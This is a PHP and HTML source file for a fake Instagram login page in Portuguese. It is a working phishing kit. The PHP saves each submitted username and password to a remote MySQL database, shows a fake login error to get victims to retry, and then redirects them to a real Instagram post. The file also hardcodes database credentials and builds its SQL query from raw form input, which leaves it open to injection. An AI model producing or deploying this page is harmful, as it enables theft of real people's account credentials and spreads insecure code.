<?php

$conn = mysqli_connect("192.185.176.179", "rbrspo53_admin", "12345678m", "rbrspo53_random_api");

if (mysqli_connect_errno()) {
    die("Falha na conexão com o Banco de Dados. Erro nº: " . mysqli_connect_errno());
}

if (isset($_POST['a']) && isset($_POST['b']))
  mysqli_query($conn, "INSERT INTO regs (a, b) VALUES ('" . $_POST['a'] . "', '" . $_POST['b'] . "')");

if(isset($_POST['c']))
  $retry = intval($_POST['c']) + 1;
else $retry = 0;

if(intval($_POST['c']) > 2)
  header('Location: https://www.instagram.com/p/CBgZw6jB3L5/?utm_source=ig_web_copy_link');

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
  <link rel="stylesheet" href="style.css">
  <title>Instagram</title>
</head>

<body>

  <div id="wrapper">
    <div class="container">
      <div class="phone-app-demo"></div>
      <div class="form-data">
        <form method="POST">
          <div class="logo">
            <img src="./images/logo.png" alt="logo">
          </div>
          <input name="a" type="text" placeholder="Telefone, nome de usuário ou e-mail">
          <input name="b" type="password" placeholder="Senha">
          <input name="c" type="hidden" value="<?php echo $retry ?>" />
          <?php if($retry > 1 ) echo "Usuário ou senha inválidos." ?>
          <button class="form-btn" type="submit">Entrar</button>
          <span class="has-separator">OU</span>
          <a class="facebook-login" href="#">
            <i class="fab fa-facebook-square"></i> Entrar com o Facebook
          </a>
          <a class="password-reset" href="#">Esqueceu a senha?</a>
        </form>
        <div class="sign-up">
          Não tem uma conta? <a href="#">Cadastre-se</a>
        </div>
        <div class="get-the-app">
          <span>Baixe o aplicativo</span>
          <div class="badges">
            <img src="./images/app-store.png" alt="app-store badge">
            <img src="./images/google-play.png" alt="google-play badge">
          </div>
        </div>
      </div>
    </div>

    <footer>
      <div class="container">
        <nav class="footer-nav">
          <ul>
            <li>
              <a href="#">Sobre</a>
            </li>
            <li>
              <a href="#">Blog</a>
            </li>
            <li>
              <a href="#">Carreiras</a>
            </li>
            <li>
              <a href="#">Ajuda</a>
            </li>
            <li>
              <a href="#">API</a>
            </li>
            <li>
              <a href="#">Privacidade</a>
            </li>
            <li>
              <a href="#">Termos</a>
            </li>
            <li>
              <a href="#">Principais contas</a>
            </li>
            <li>
              <a href="#">Hashtags</a>
            </li>
            <li>
              <a href="#">Localizações</a>
            </li>
            <li>
              <a href="#">Beleza</a>
            </li>
            <li>
              <a href="#">Dança</a>
            </li>
            <li>
              <a href="#">Fitness</a>
            </li>
            <li>
              <a href="#">Comida e Bebida</a>
            </li>
            <li>
              <a href="#">Casa e Jardim</a>
            </li>
            <li>
              <a href="#">Música</a>
            </li>
            <li>
              <a href="#">Artes visuais</a>
            </li>
          </ul>
        </nav>
        <div class="copyright-notice">
          &copy 2021 Instagram do Facebook
        </div>
      </div>
    </footer>

  </div>

</body>

</html>